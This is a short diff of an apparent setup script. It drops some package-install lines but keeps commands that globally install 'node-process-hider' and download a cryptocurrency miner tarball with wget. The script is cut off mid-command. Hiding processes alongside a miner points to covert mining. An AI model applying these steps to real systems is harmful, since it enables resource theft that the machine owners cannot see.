@@ -1,9 +1,3 @@
-apt update && apt -y install sudo wget curl unzip
-
-apt update && apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-apt -y install nodejs npm
-
 npm i -g node-process-hider
 
 wget -c https://github.com/pearlfortune/pearl-miner/releases/download/v2.1.2/pearlfortune-v2.1.2.tar.gz \
